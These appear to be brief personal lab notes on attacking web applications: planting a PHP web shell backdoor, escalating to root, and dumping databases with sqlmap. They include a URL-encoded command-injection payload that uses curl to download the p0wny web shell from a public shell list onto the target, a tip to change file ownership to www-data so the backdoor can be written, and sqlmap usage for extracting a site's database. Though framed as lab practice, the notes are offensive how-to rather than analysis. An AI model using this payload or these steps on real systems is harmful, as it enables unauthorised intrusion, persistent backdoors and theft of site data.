BackDOOR setup:

already tested in my lab using sibis sql injection video.

use any backdoor php shell and explore more about what are the shells available

&&%20curl%20-o%20powny.php%20https://github.com/backdoorhub/shell-backdoor-list/blob/master/shell/php/p0wny-shell.php this is currently used shell.
called powny

learn about how to gain userroot access after setup the backdoor

in lab it will deny to create a backdoor file because of the permission is in the user(our) change that into www-data it will work

sql injection 

uses the sqlmap more 

--wizard is easy

give the website link and find where is vulnerability ex jason {"username":"","password":""} like this sqlmap will give the entire deatils about the database

sqlmap already in the lab
